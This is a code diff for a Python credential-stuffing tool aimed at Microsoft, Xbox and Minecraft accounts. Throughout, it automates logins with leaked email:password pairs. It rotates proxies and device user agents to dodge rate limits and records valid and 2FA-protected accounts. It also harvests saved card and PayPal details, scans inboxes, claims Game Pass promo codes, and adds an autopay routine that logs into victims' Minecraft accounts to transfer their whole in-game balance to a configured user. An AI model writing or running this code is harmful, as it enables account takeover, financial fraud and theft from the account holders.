                 ui.log_error(f'✗ Webhook failed: {response.status_code} - {response.text[:100]}')
-        except requests.exceptions.Timeout:
-            if UI_ENABLED and ui:
-                ui.log_error('[Webhook] Request timeout - Discord may be slow')
         except requests.exceptions.ConnectionError:
             if UI_ENABLED and ui:
                 ui.log_error('[Webhook] Connection error - check internet')
@@ -2184,75 +2534,125 @@ class Capture:
             if UI_ENABLED and ui:
                 ui.log_error(f'[Webhook] Error: {type(e).__name__}: {str(e)[:100]}')
 
-_sftag_lock = threading.Lock()  
-def get_urlPost_sFTTag(session):
-    global retries
-    attempts = 0
-    while attempts < maxretries:
+    def check_donut_smp(self):
+        if not self.name or self.name == 'N/A':
+            return
         try:
-            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'}
-            timeout_val = int(config.get('timeout', 10))
-            text = session.get(sFTTag_url, headers=headers, timeout=timeout_val).text
-            match = RE_SFTTAG_VALUE.search(text)
-            if match:
-                sFTTag = next((g for g in match.groups() if g is not None), None)
-                if sFTTag:
-                    match_url = RE_URLPOST_VALUE.search(text)
-                    if match_url:
-                        urlPost = next((g for g in match_url.groups() if g is not None), None)
-                        if urlPost:
-                            urlPost = urlPost.replace('&amp;', '&')
-                            return (urlPost, sFTTag, session)
+            donut_api_url = 'https://api.donutsmp.net/v1/stats/'
+            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'application/json'}
+            r = self.session.get(f'{donut_api_url}{self.name}', headers=headers, timeout=12)
+            if r.status_code == 200:
+                data = r.json()
+                if isinstance(data, dict) and 'result' in data:
+                    stats_data = data['result']
+                    lines = [f'{self.email}:{self.password}', f'Username: {self.name}']
+                    for k, v in stats_data.items():
+                        lines.append(f'{k}: {v}')
+                    target_fn = self.fname if hasattr(self, 'fname') else fname
+                    donut_content = '\n'.join(lines) + '\n' + '='*40 + '\n'
+                    write_dedupe(target_fn, 'donut_stats.txt', donut_content)
+                    if UI_ENABLED and ui:
+                        ui.log_info(f'Donut SMP stats saved for {self.name}')
         except Exception:
             pass
-        session.proxies = getproxy()
-        retries += 1
-        attempts += 1
-        time.sleep(0.5 if is_no_proxy() else 0.1)
-    return ("ERROR", None, session)
-def get_xbox_rps(session, email, password, urlPost, sFTTag):
-    global bad, checked, cpm, twofa, retries
-    tries = 0
-    while tries < maxretries:
+
+    def autopay_donutsmp(self):
+        global autopay_count
+        if not MINECRAFT_AVAILABLE:
+            return
+        pay_target = config.get('donutsmp_pay_username', '') or config.get('pay_target', '')
+        if not pay_target or pay_target in ('YOUR_USERNAME', ''):
+            return
         try:
-            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
-            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'close'}
-            login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=int(config.get('timeout', 10)))
-            if '#' in login_request.url and login_request.url != sFTTag_url:
-                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
-                if token != 'None':
-                    return (token, session)
-            elif 'cancel?mkt=' in login_request.text:
-                ipt = RE_IPT.search(login_request.text).group()
-                pprid = RE_PPRID.search(login_request.text).group()
-                uaid = RE_UAID.search(login_request.text).group()
-                data = {'ipt': ipt, 'pprid': pprid, 'uaid': uaid}
-                
-                action_url = RE_ACTION_FMHF.search(login_request.text).group()
-                ret = session.post(action_url, data=data, allow_redirects=True, timeout=int(config.get('timeout', 10)))
-                
-                return_url = RE_RETURN_URL.search(ret.text).group()
-                fin = session.get(return_url, allow_redirects=True, timeout=int(config.get('timeout', 10)))
-                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
-                if token != 'None':
-                    return (token, session)
-            elif any((value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt='])):
-                with open(f'results/{fname}/2fa.txt', 'a') as file:
-                    file.write(f'{email}:{password}\n')
-                return ('2FA', session)
-            elif any((value in login_request.text.lower() for value in ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist", 'sign in to your microsoft account', "tried to sign in too many times with an incorrect account or password", 'help us protect your account'])):
-                return ('None', session)
-            else:
-                session.proxies = getproxy()
-                retries += 1
-                tries += 1
-                time.sleep(0.1)
-        except Exception as e:
-            session.proxies = getproxy()
-            retries += 1
-            tries += 1
-            time.sleep(2 if is_no_proxy() else 0.1)
+            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
+            auth_token.profile = Profile(id_=self.uuid, name=self.name)
+            server_host = config.get('donutsmp_server_host', 'play.donutsmp.net')
+            connection = Connection(server_host, 25565, auth_token=auth_token, initial_version=47, allowed_versions={47})
+
+            @connection.listener(clientbound_play.JoinGamePacket)
+            def on_join(packet):
+                def delayed_pay():
+                    time.sleep(2.0)
+                    if UI_ENABLED and ui:
+                        ui.log_info(f'Donut SMP AutoPay: Sending /pay {pay_target} * from {self.name}')
+                    chat = ChatPacket(message=f'/pay {pay_target} *')
+                    connection.write_packet(chat)
+                    with stats_lock:
+                        global autopay_count
+                        autopay_count += 1
+                    target_fn = self.fname if hasattr(self, 'fname') else fname
+                    pay_line = f'{self.email}:{self.password} | Sent /pay {pay_target} * (Name: {self.name})\n'
+                    write_dedupe(target_fn, 'donutsmp_autopay.txt', pay_line)
+                    if UI_ENABLED and ui:
+                        ui.add_log(f'DonutSMP AutoPay SUCCESS: {self.name} -> {pay_target}', 'SUCCESS')
+                    time.sleep(1.0)
+                    connection.disconnect()
+                threading.Thread(target=delayed_pay, daemon=True).start()
+
+            connection.connect()
+            time.sleep(1.5)
+            if getattr(connection, 'networking_thread', None):
+                connection.disconnect()
+        except Exception:
+            pass
+
+
+_sftag_lock = threading.Lock()
+def get_urlPost_sFTTag(session):
+    global retries
+    try:
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'}
+        timeout_val = int(config.get('timeout', 10))
+        text = session.get(sFTTag_url, headers=headers, timeout=timeout_val).text
+        match = RE_SFTTAG_VALUE.search(text)
+        if match:
+            sFTTag = next((g for g in match.groups() if g is not None), None)
+            if sFTTag:
+                match_url = RE_URLPOST_VALUE.search(text)
+                if match_url:
+                    urlPost = next((g for g in match_url.groups() if g is not None), None)
+                    if urlPost:
+                        urlPost = urlPost.replace('&amp;', '&')
+                        return (urlPost, sFTTag, session)
+    except Exception:
+        pass
+    retries += 1
+    return ("ERROR", None, session)
+
+def get_xbox_rps(session, email, password, urlPost, sFTTag):
+    global bad, checked, cpm, twofa, retries, fname
+    try:
+        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
+        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'close'}
+        login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=int(config.get('timeout', 10)))
+        if '#' in login_request.url and login_request.url != sFTTag_url:
+            token = urllib.parse.parse_qs(urllib.parse.urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
+            if token != 'None':
+                return (token, session)
+        elif 'cancel?mkt=' in login_request.text:
+            ipt = RE_IPT.search(login_request.text).group()
+            pprid = RE_PPRID.search(login_request.text).group()
+            uaid = RE_UAID.search(login_request.text).group()
+            data = {'ipt': ipt, 'pprid': pprid, 'uaid': uaid}
+            
+            action_url = RE_ACTION_FMHF.search(login_request.text).group()
+            ret = session.post(action_url, data=data, allow_redirects=True, timeout=int(config.get('timeout', 10)))
+            
+            return_url = RE_RETURN_URL.search(ret.text).group()
+            fin = session.get(return_url, allow_redirects=True, timeout=int(config.get('timeout', 10)))
+            token = urllib.parse.parse_qs(urllib.parse.urlparse(fin.url).fragment).get('access_token', ['None'])[0]
+            if token != 'None':
+                return (token, session)
+        elif any((value in login_request.text for value in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt='])):
+            write_dedupe(fname, '2fa.txt', f'{email}:{password}\n')
+            return ('2FA', session)
+        elif any((value in login_request.text.lower() for value in ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist", "we couldn't find an account", "incorrect username or password", "the email address or password is incorrect", "sign-in name or password does not match"])):
+            return ('None', session)
+    except Exception:
+        pass
+    retries += 1
     return ('ERROR', session)
+
 def payment(session, email, password):
     global retries, payment_methods, hits, config
     attempts = 0
@@ -2402,14 +2802,12 @@ def payment(session, email, password):
             if has_payment_method or balance or subscription1 or subscription2 or subscription3:
                 if credit_card and last4:
                     card_capture = f'{email}:{password} | Card: {credit_card} | Last4: {last4} | Exp: {expiry_month}/{expiry_year} | Type: {card_type} | Holder: {card_holder}'
-                    with open(f'results/{fname}/Cards.txt', 'a', encoding='utf-8') as f:
-                        f.write(card_capture + '\n')
+                    write_dedupe(fname, 'payment.txt', card_capture + '\n')
                     if UI_ENABLED and ui:
                         ui.log_info(f'Card captured: {credit_card} ending {last4}')
                 if paypal_email:
                     paypal_capture = f"{email}:{password} | PayPal: {paypal_email} | Holder: {fullname or 'N/A'}"
-                    with open(f'results/{fname}/Cards.txt', 'a', encoding='utf-8') as f:
-                        f.write(paypal_capture + '\n')
+                    write_dedupe(fname, 'payment.txt', paypal_capture + '\n')
                     if UI_ENABLED and ui:
                         ui.log_info(f'PayPal captured: {paypal_email}')
                 payment += '\n============================\n'
@@ -2420,96 +2818,81 @@ def payment(session, email, password):
         except Exception as e:
             retries += 1
             session.proxies = getproxy()
-            time.sleep(2)
+            time.sleep(0.1)
+
+
+_enrichment_pool = None  
+
+def enrich_valid_account(session, email, password, xbl_token, target_fname):
+
+    try:
+        checker = MicrosoftChecker(session, email, password, config, target_fname)
+
+        try:
+            checker.check_country()
+        except Exception:
+            pass
+
+        if config.get('scan_inbox', True):
+            try:
+                keywords_str = config.get('inbox_keywords', '')
+                if keywords_str and isinstance(keywords_str, str) and keywords_str.strip():
+                    keywords = [k.strip() for k in keywords_str.split(',') if k.strip()]
+                else:
+                    keywords = ["steam", "netflix", "Crunchyroll", "discord", "microsoft", "nordvpn", "paypal", "roblox", "epic games", "spotify", "playstation", "xbox"]
+                inbox_results = checker.check_inbox(keywords)
+                if inbox_results:
+                    for keyword, match_count in inbox_results:
+                        if match_count and int(match_count) > 0:
+                            clean_kw = "".join([c for c in str(keyword) if c.isalnum() or c in (' ', '_', '-')]).strip()
+                            safe_keyword = clean_kw.title().replace(' ', '_') if clean_kw else "Search_Hit"
+                            write_dedupe(target_fname, f'Inboxes/{safe_keyword}.txt', f'{email}:{password}\n')
+                    formatted_results = ', '.join([f'{k} ({v})' for k, v in inbox_results])
+                    write_dedupe(target_fname, 'Inbox.txt', f'{email}:{password} | Inbox - {formatted_results}\n')
+            except Exception:
+                pass
+
+        if xbl_token:
+            try:
+                fetch_discord_promos(session, email, password, xbl_token, target_fname)
+            except Exception:
+                pass
+
+        if config.get('payment', False) or config.get('check_payment', False):
+            try:
+                checker.check_payment_instruments()
+            except Exception:
+                pass
+
+        if config.get('check_microsoft_balance', False):
+            try:
+                bal = checker.check_balance()
+                if bal and bal != '0.00 USD':
+                    write_dedupe(target_fname, 'balance.txt', f'{email}:{password} | Balance: {bal}\n')
+            except Exception:
+                pass
+
+        if config.get('check_rewards_points', True) or config.get('check_reward_points', True):
+            try:
+                pts = checker.check_rewards_points()
+                if pts and str(pts) != '0':
+                    write_dedupe(target_fname, 'point.txt', f'{email}:{password} | Points: {pts}\n')
+            except Exception:
+                pass
+    except Exception:
+        pass
+
 def validmail(email, password):
     global vm
-    vm += 1
-    with open(f'results/{fname}/Valid_Mail.txt', 'a') as file:
-        file.write(f'{email}:{password}\n')
-    meowapi_stats = ''
+    with stats_lock:
+        vm += 1
     try:
-        username = email.split('@')[0]
-        if username:
-            stats = fetch_meowapi_stats(username)
-            if stats:
-                meowapi_stats = f' | MeowAPI: {stats}'
+        write_dedupe(fname, 'valid_mail.txt', f'{email}:{password}\n')
     except Exception:
         pass
     if UI_ENABLED and ui:
-        ui.add_log(f'Valid Mail: {email}{meowapi_stats}', 'SUCCESS')
-def capture_mc(access_token, session, email, password, type):
-    global retries
-    attempts = 0
-    while attempts < maxretries:
-        attempts += 1
-        try:
-            pass
-            r = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {access_token}'}, timeout=min(12 + (attempts - 1) * 2, 18))
-            if r.status_code == 200:
-                data = {}
-                try:
-                    data = r.json()
-                except Exception:
-                    data = {}
-                name = data.get('name', 'N/A') or 'N/A'
-                uuid = data.get('id', 'N/A') or 'N/A'
-                try:
-                    capes = ', '.join([cape.get('alias') for cape in data.get('capes', []) if cape.get('alias')])
-                except Exception:
-                    capes = ''
-                CAPTURE = Capture(email, password, name, capes, uuid, access_token, type, session)
-                CAPTURE.handle(session)
-                break
-            elif r.status_code == 429:
-                retries += 1
-                session.proxies = getproxy()
-                time.sleep(random.uniform(2, 4) if is_no_proxy() else 0.5)
-                if attempts >= maxretries:
-                    CAPTURE = Capture(email, password, 'N/A', '', None, access_token, type, session)
-                    CAPTURE.handle(session)
-                    break
-                continue
-            else:
-                CAPTURE = Capture(email, password, 'N/A', '', None, access_token, type, session)
-                CAPTURE.handle(session)
-                break
-        except Exception:
-            retries += 1
-            session.proxies = getproxy()
-            time.sleep(2 if is_no_proxy() else 0.1)
-            if attempts >= maxretries:
-                try:
-                    CAPTURE = Capture(email, password, None, '', None, access_token, type, session)
-                    CAPTURE.handle(session)
-                except Exception:
-                    pass
-            continue
-def checkownership(entitlements_response):
-    items = entitlements_response.get('items', [])
-    has_normal_minecraft = False
-    has_game_pass_pc = False
-    has_game_pass_ultimate = False
-    for item in items:
-        name = item.get('name', '')
-        source = item.get('source', '')
-        if name in ('game_minecraft', 'product_minecraft') and source in ('PURCHASE', 'MC_PURCHASE'):
-            has_normal_minecraft = True
-        if name == 'product_game_pass_pc':
-            has_game_pass_pc = True
-        if name == 'product_game_pass_ultimate':
-            has_game_pass_ultimate = True
-    if has_normal_minecraft and has_game_pass_pc:
-        return 'Normal Minecraft (with Game Pass)'
-    if has_normal_minecraft and has_game_pass_ultimate:
-        return 'Normal Minecraft (with Game Pass Ultimate)'
-    elif has_normal_minecraft:
-        return 'Normal Minecraft'
-    elif has_game_pass_ultimate:
-        return 'Xbox Game Pass Ultimate'
-    elif has_game_pass_pc:
-        return 'Xbox Game Pass (PC)'
+        ui.add_log(f'{Fore.LIGHTCYAN_EX}[VALID_MAIL]{Style.RESET_ALL} {email}:{password}', 'VALID_MAIL')
 
-    return None
 def claim_buddypass_offers(session, xbox_token, fname):
     global retries
     codes = []
@@ -2523,7 +2906,7 @@ def claim_buddypass_offers(session, xbox_token, fname):
                 retries += 1
                 session.proxies = getproxy()
                 if len(proxylist) == 0:
-                    time.sleep(20)
+                    return  # skip buddypass if rate limited
                 continue
         else:
             return
@@ -2543,7 +2926,7 @@ def claim_buddypass_offers(session, xbox_token, fname):
                 retries += 1
                 session.proxies = getproxy()
                 if len(proxylist) == 0:
-                    time.sleep(20)
+                    return  # skip buddypass if rate limited
                 continue
         else:
             return
@@ -2608,12 +2991,9 @@ def claim_buddypass_offers(session, xbox_token, fname):
         pass
 
 def fetch_discord_promos(session, email, password, xbox_token, fname):
-    """
-    Fetch Discord promo offers from Xbox Game Pass.
-    Uses the XBL3.0 token with xboxlive.com relying party (same as promo.py).
-    """
+    if not xbox_token:
+        return
     try:
-
         xsts_gp = None
         for attempt in range(maxretries):
             try:
@@ -2638,14 +3018,13 @@ def fetch_discord_promos(session, email, password, xbox_token, fname):
                         xsts_gp = f'XBL3.0 x={uhs};{xsts_token}'
                         break
                 else:
-                    break  
+                    break
             except Exception:
                 time.sleep(0.3)
                 continue
 
         if not xsts_gp:
             return
-
 
         offers_r = None
         for attempt in range(maxretries):
@@ -2669,8 +3048,8 @@ def fetch_discord_promos(session, email, password, xbox_token, fname):
         for offer in offers_r.json().get('offers', []):
             promo = None
             status = offer.get('offerStatus')
+            offer_name = offer.get('offerName', offer.get('name', 'Promo'))
             if status == 'available':
-
                 try:
                     pr = session.post(
                         f"https://profile.gamepass.com/v2/offers/{offer.get('offerId')}",
@@ -2684,132 +3063,205 @@ def fetch_discord_promos(session, email, password, xbox_token, fname):
             elif status == 'claimed':
                 promo = offer.get('resource')
 
-            if promo and 'discord' in promo.lower():
-                write_dedupe(fname, 'Discord_Promos.txt', f'{email}:{password} | {promo}\n')
+            if promo:
+                promo_line = f'{email}:{password} | {promo}\n'
+                write_dedupe(fname, 'Promo.txt', promo_line)
+                if 'discord' in str(promo).lower() or 'discord' in str(offer_name).lower():
+                    write_dedupe(fname, 'Discord_Promos.txt', promo_line)
                 if UI_ENABLED and ui:
-                    ui.add_log(f'Other: Discord Promo: {email} | {promo}', 'INFO')
-                break
+                    ui.add_log(f'Promo: {email} | {promo}', 'SUCCESS')
     except Exception:
         pass
+
+def checkownership(entitlements_response):
+    if not entitlements_response or not isinstance(entitlements_response, dict):
+        return None
+    items = entitlements_response.get('items', [])
+    if not items:
+        return None
+    has_normal_minecraft = False
+    has_game_pass_pc = False
+    has_game_pass_ultimate = False
+    for item in items:
+        name = item.get('name', '')
+        source = item.get('source', '')
+        name_lower = str(name).lower()
+        source_upper = str(source).upper()
+
+        if name in ('game_minecraft', 'product_minecraft') and source in ('PURCHASE', 'MC_PURCHASE'):
+            has_normal_minecraft = True
+
+        elif 'minecraft' in name_lower and name_lower not in ('minecraft_realms',):
+            has_normal_minecraft = True
+
+        if name == 'product_game_pass_ultimate' or 'game_pass_ultimate' in name_lower or 'xgpu' in name_lower:
+            has_game_pass_ultimate = True
+        elif name == 'product_game_pass_pc' or ('game_pass' in name_lower and 'ultimate' not in name_lower) or 'xgp' in name_lower:
+            has_game_pass_pc = True
+
+    if has_normal_minecraft and has_game_pass_ultimate:
+        return 'Normal Minecraft (with Game Pass Ultimate)'
+    if has_normal_minecraft and has_game_pass_pc:
+        return 'Normal Minecraft (with Game Pass)'
+    if has_normal_minecraft:
+        return 'Normal Minecraft'
+    if has_game_pass_ultimate:
+        return 'Xbox Game Pass Ultimate'
+    if has_game_pass_pc:
+        return 'Xbox Game Pass (PC)'
+    return None
 
 def checkmc(session, email, password, token, xbox_token):
     global retries, cpm, checked, xgp, xgpu, other, config
     acctype = None
     attempts = 0
-    max_time = time.time() + 90
+    max_time = time.time() + 30
     checkrq = None
+    _no_proxy = is_no_proxy()
+
+
     while attempts < maxretries and time.time() < max_time:
         attempts += 1
         try:
-            checkrq = session.get('https://api.minecraftservices.com/entitlements/license', headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=10)
+            checkrq = session.get('https://api.minecraftservices.com/entitlements/license',
+                                  headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=10)
             if checkrq.status_code == 429:
-                retries += 1
-                session.proxies = getproxy()
-
-                time.sleep(random.uniform(3, 6) if is_no_proxy() else 0.5)
+                with stats_lock:
+                    retries += 1
+                if not _no_proxy:
+                    session.proxies = getproxy()
+                time.sleep(0.5 if _no_proxy else 0.3)
                 continue
             else:
                 break
-        except Exception as e:
-            retries += 1
-            if UI_ENABLED and ui:
-                ui.log_error(f'Network error: {str(e)[:100]}')
-            session.proxies = getproxy()
-            time.sleep(1 if is_no_proxy() else 0.1)
+        except Exception:
+            with stats_lock:
+                retries += 1
+            if not _no_proxy:
+                session.proxies = getproxy()
             continue
-    if time.time() >= max_time:
-        if UI_ENABLED and ui:
-            ui.log_error(f'Timeout checking {email} (took >90s)')
-        return False
-    if checkrq is not None and checkrq.status_code == 200:
-        acctype = checkownership(checkrq.json())
-        if acctype is None:
 
+    if time.time() >= max_time:
+        return False
+
+    if checkrq is not None and checkrq.status_code == 200:
+        try:
+            acctype = checkownership(checkrq.json())
+        except Exception:
+            pass
+
+        if acctype is None:
             try:
                 profilerq = session.get('https://api.minecraftservices.com/minecraft/profile',
                                         headers={'Authorization': f'Bearer {token}'}, timeout=10)
                 if profilerq.status_code == 200:
-                    acctype = 'Normal Minecraft'  
-                else:
-                    return False  
-            except Exception:
-                return False
-
-
-        name, uuid_str, capes_list = 'N/A', 'N/A', []
-        try:
-            profilerq = session.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {token}'}, timeout=10)
-            if profilerq.status_code == 200:
-                p_data = profilerq.json()
-                name = p_data.get('name', 'N/A') or 'N/A'
-                uuid_str = p_data.get('id', 'N/A') or 'N/A'
-                capes_data = p_data.get('capes', [])
-                for c in capes_data:
-                    if c.get('alias'): capes_list.append(c['alias'])
-        except Exception:
-            pass
-
-        capes_str = ', '.join(capes_list)
-
-
-        try:
-            capture = Capture(email, password, name, capes_str, uuid_str, token, acctype, session)
-            capture.handle(session)
-        except Exception as e:
-            if UI_ENABLED and ui:
-                ui.log_error(f'Capture error: {e}')
-
-            try:
-                write_dedupe(fname, 'Hits.txt', f'{email}:{password}\n')
-                with stats_lock:
-                    global hits
-                    hits += 1
+                    acctype = 'Normal Minecraft'
             except Exception:
                 pass
 
-        if acctype == 'Xbox Game Pass Ultimate' or acctype == 'Normal Minecraft (with Game Pass Ultimate)':
+
+    if not acctype:
+        try:
+            storerq = session.get('https://api.minecraftservices.com/entitlements/mcstore',
+                                  headers={'Authorization': f'Bearer {token}'}, verify=False, timeout=10)
+            if storerq.status_code == 200:
+                acctype = checkownership(storerq.json())
+        except Exception:
+            pass
+
+
+    if not acctype:
+        try:
+            profilerq = session.get('https://api.minecraftservices.com/minecraft/profile',
+                                    headers={'Authorization': f'Bearer {token}'}, timeout=10)
+            if profilerq.status_code == 200:
+                acctype = 'Normal Minecraft'
+        except Exception:
+            pass
+
+    if not acctype:
+        return False
+
+
+    name, uuid_str, capes_list = 'N/A', 'N/A', []
+    try:
+        profilerq = session.get('https://api.minecraftservices.com/minecraft/profile',
+                                headers={'Authorization': f'Bearer {token}'}, timeout=10)
+        if profilerq.status_code == 200:
+            p_data = profilerq.json()
+            name = p_data.get('name', 'N/A') or 'N/A'
+            uuid_str = p_data.get('id', 'N/A') or 'N/A'
+            capes_data = p_data.get('capes', [])
+            for c in capes_data:
+                if isinstance(c, dict) and c.get('alias'):
+                    capes_list.append(c['alias'])
+    except Exception:
+        pass
+
+    capes_str = ', '.join(capes_list)
+
+    try:
+        capture = Capture(email, password, name, capes_str, uuid_str, token, acctype, session)
+        capture.handle(session)
+    except Exception as e:
+        if UI_ENABLED and ui:
+            ui.log_error(f'Capture error: {e}')
+        try:
+            write_dedupe(fname, 'Hits.txt', f'{email}:{password}\n')
             with stats_lock:
-                xgpu += 1
-            write_dedupe(fname, 'XboxGamePassUltimate.txt', f'{email}:{password}\n')
-            if 'Normal' in acctype:
-                write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
-            try: claim_buddypass_offers(session, xbox_token, fname)
-            except Exception: pass
-            try: fetch_discord_promos(session, email, password, xbox_token, fname)
-            except Exception: pass
-            return True
-        elif acctype == 'Xbox Game Pass (PC)' or acctype == 'Normal Minecraft (with Game Pass)':
-            with stats_lock:
-                xgp += 1
-            write_dedupe(fname, 'XboxGamePass.txt', f'{email}:{password}\n')
-            if 'Normal' in acctype:
-                write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
-            try: claim_buddypass_offers(session, xbox_token, fname)
-            except Exception: pass
-            try: fetch_discord_promos(session, email, password, xbox_token, fname)
-            except Exception: pass
-            return True
-        elif acctype == 'Normal Minecraft':
-            write_dedupe(fname, 'Normal.txt', f'{email}:{password}\n')
-            return True
+                global hits
+                hits += 1
+        except Exception:
+            pass
+
+    if acctype in ('Xbox Game Pass Ultimate', 'Normal Minecraft (with Game Pass Ultimate)'):
+        with stats_lock:
+            xgpu += 1
+        write_dedupe(fname, 'xbox game pass unlimited.txt', f'{email}:{password}\n')
+        if 'Normal' in acctype:
+            write_dedupe(fname, 'normal.txt', f'{email}:{password}\n')
+        try: claim_buddypass_offers(session, xbox_token, fname)
+        except Exception: pass
+        try: fetch_discord_promos(session, email, password, xbox_token, fname)
+        except Exception: pass
         return True
+    elif acctype in ('Xbox Game Pass (PC)', 'Normal Minecraft (with Game Pass)'):
+        with stats_lock:
+            xgp += 1
+        write_dedupe(fname, 'xbox game pass.txt', f'{email}:{password}\n')
+        if 'Normal' in acctype:
+            write_dedupe(fname, 'normal.txt', f'{email}:{password}\n')
+        try: claim_buddypass_offers(session, xbox_token, fname)
+        except Exception: pass
+        try: fetch_discord_promos(session, email, password, xbox_token, fname)
+        except Exception: pass
+        return True
+    elif acctype == 'Normal Minecraft':
+        write_dedupe(fname, 'normal.txt', f'{email}:{password}\n')
+        try: claim_buddypass_offers(session, xbox_token, fname)
+        except Exception: pass
+        try: fetch_discord_promos(session, email, password, xbox_token, fname)
+        except Exception: pass
+        return True
+    return True
 def mc_token(session, uhs, xsts_token):
     global retries
     attempts = 0
+    _no_proxy = is_no_proxy()
     while attempts < maxretries:
         attempts += 1
         try:
-            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f'XBL3.0 x={uhs};{xsts_token}'}, headers={'Content-Type': 'application/json'}, timeout=15)
+            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f'XBL3.0 x={uhs};{xsts_token}'}, headers={'Content-Type': 'application/json'}, timeout=6)
             if mc_login.status_code == 429:
-                session.proxies = getproxy()
-                time.sleep((random.uniform(5, 10)) if is_no_proxy() else (0.5 if len(proxylist) > 0 else 2))
+                if not _no_proxy:
+                    session.proxies = getproxy()
+                time.sleep(0.15 if not _no_proxy else 0.3)
                 continue
             else:
                 return mc_login.json().get('access_token')
-        except:
-            retries += 1
-            session.proxies = getproxy()
-            time.sleep(2 if is_no_proxy() else 0.1)
+        except Exception:
+            if not _no_proxy:
+                session.proxies = getproxy()
             continue
     return None
 RE_SFTTAG_VALUE = re.compile(r'value=\\"(.+?)\\"|value="(.+?)"|sFTTag:\'(.+?)\'|sFTTag:"(.+?)"|name=\\"PPFT\\".*?value=\\"(.+?)\\"', re.S)
@@ -2820,21 +3272,43 @@ RE_UAID = re.compile(r'(?<="uaid" value=").+?(?=">)')
 RE_ACTION_FMHF = re.compile(r'(?<=id="fmHF" action=").+?(?=" )')
 RE_RETURN_URL = re.compile(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)')
 
+_thread_local = threading.local()
+
+DEVICE_USER_AGENTS = [
+    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 PKeyAuth/1.0',
+    'Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36 PKeyAuth/1.0',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
+    'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36',
+]
+
+def get_random_device_ua():
+    return random.choice(DEVICE_USER_AGENTS)
+
+def get_thread_session():
+    if not hasattr(_thread_local, 'session') or _thread_local.session is None:
+        session = requests.Session()
+        session.verify = False
+        pool_size = max(1000, int(config.get('connection_pool_size', 1000)))
+        retry_strategy = Retry(total=0, connect=0, read=0)
+        adapter = HTTPAdapter(pool_connections=pool_size, pool_maxsize=pool_size, max_retries=retry_strategy)
+        session.mount('https://', adapter)
+        session.mount('http://', adapter)
+        session.headers.update({
+            'User-Agent': get_random_device_ua(),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        })
+        _thread_local.session = session
+    return _thread_local.session
+
 def create_optimized_session():
